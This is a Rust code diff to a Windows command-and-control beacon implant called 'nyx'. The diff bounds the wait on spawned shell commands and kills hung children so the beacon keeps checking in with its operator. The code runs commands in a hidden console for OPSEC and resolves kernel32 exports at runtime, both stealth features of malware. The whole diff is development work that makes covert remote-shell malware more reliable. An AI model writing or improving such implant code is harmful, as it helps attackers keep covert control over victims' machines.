@@ -27,8 +27,15 @@ const STARTF_USESTDHANDLES: u32 = 0x100;
 /// CREATE_NO_WINDOW: the child runs with no visible console. OPSEC rationale —
 /// spawning cmd.exe would otherwise flash a conhost window to the user.
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-/// WaitForSingleObject timeout: wait forever for the child to exit.
-const INFINITE: u32 = 0xFFFF_FFFF;
+/// WaitForSingleObject timeout for reaping the child process. Bounded (NOT
+/// INFINITE) so a hung/long-running child (`ping -t`, a stuck binary) cannot
+/// block the beacon forever — an INFINITE wait would permanently kill beacon
+/// check-ins (P1-7). 30 s covers normal shell commands; on timeout we
+/// TerminateProcess so the beacon survives and signals the operator.
+const SHELL_TIMEOUT: u32 = 30_000;
+/// WaitForSingleObject return value: the timeout elapsed without the handle
+/// being signaled (the child did not exit in time).
+const WAIT_TIMEOUT: u32 = 0x0000_0102;
 /// SetHandleInformation dwMask / dwFlags value: the handle's inherit bit.
 const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
 /// Upper bound on captured stdout. Prevents a runaway child (`ping -t`,
@@ -280,11 +287,20 @@ unsafe fn run_shell_inner(args: &str) -> Response {
             let _ = term(pi.h_process, 1);
         }
     }
-    // WaitForSingleObject blocks until the child exits (INFINITE). After the
-    // TerminateProcess above (or natural exit), it returns promptly. We ignore
-    // the result — we already captured the output; the exit code isn't surfaced
-    // on the wire (Response::Output carries bytes only).
-    wait_for_single(pi.h_process, INFINITE);
+    // Bounded reap: wait up to SHELL_TIMEOUT for the child to exit. If the
+    // `capped` branch above already TerminateProcess'd it, this returns at
+    // once (the handle is signaled on exit). On WAIT_TIMEOUT the child is
+    // still alive (hung/long-running) — kill it so the beacon survives and
+    // signal the forced termination to the operator.
+    let wait_result = wait_for_single(pi.h_process, SHELL_TIMEOUT);
+    if wait_result == WAIT_TIMEOUT {
+        type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
+        if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
+            let term: TerminateProcess = core::mem::transmute(addr);
+            let _ = term(pi.h_process, 1);
+        }
+        out.extend_from_slice(b"\n<nyx: shell command timed out and was killed>\n");
+    }
     // Best-effort exit-code harvest (unused today — Response has no exit-code
     // variant), but it documents the resolved GetExitCodeProcess export is live.
     let mut exit_code: u32 = 0;
